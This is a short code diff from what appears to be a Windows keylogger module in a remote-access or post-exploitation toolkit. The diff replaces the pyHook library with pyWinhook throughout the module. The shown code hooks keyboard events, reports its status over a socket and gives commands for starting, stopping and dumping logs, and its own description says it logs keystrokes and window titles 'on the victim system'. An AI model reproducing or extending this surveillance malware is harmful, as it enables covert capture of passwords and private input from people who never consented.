@@ -5,7 +5,7 @@ config.main()
 
 def main(option):
     if option == 'generate':
-        config.import_statements.append('import pyHook')
+        config.import_statements.append('import pyWinhook')
         config.import_statements.append('import pythoncom')
         config.import_statements.append('import threading')
         config.import_statements.append('from ctypes import windll')
@@ -37,7 +37,7 @@ def key(option):
         if active_logger:
             send_all(s,'[-]Keylogger already started')
         else:
-            hooks_manager = pyHook.HookManager()
+            hooks_manager = pyWinhook.HookManager()
             hooks_manager.KeyDown = OnKeyboardEvent
             hooks_manager.HookKeyboard()
             active_logger = not active_logger
@@ -68,6 +68,6 @@ def key(option):
     elif option == 'info':
         print('\nName             : Keylogger and window logger component' \
               '\nOS               : Windows' \
-              '\nRequired Modules : PyHook (External), pythoncom (External), threading, ctypes' \
+              '\nRequired Modules : pyWinhook (External), pythoncom (External), threading, ctypes' \
               '\nCommands         : key_start, key_stop, key_dump' \
               '\nDescription      : Runs a keylogger on the victim system which logs in-memory also logs which windows it is captured in, to view the log run the key_dump command\n')
